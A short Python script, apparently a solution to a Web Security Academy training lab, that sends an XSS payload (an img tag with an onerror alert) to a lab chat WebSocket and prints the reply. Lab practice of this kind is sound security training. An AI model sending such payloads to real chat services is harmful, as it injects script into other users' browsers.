import asyncio
import websockets
import json

async def chat():
    websocket_uri = "wss://0a740012033ae9e1802b036100e800e5.web-security-academy.net/chat"
    async with websockets.connect(websocket_uri) as websocket:
        # XSS payload using img tag and onerror event
        xss_payload = '<img src=x onerror=alert("XSS")>'
        
        msg = {'message': xss_payload}
        json_msg = json.dumps(msg)
        print(f"Sending {json_msg}")
        await websocket.send(json_msg)
        
        # Wait for server response
        resp = await websocket.recv()
        print(f"Received {resp}")

asyncio.get_event_loop().run_until_complete(chat())
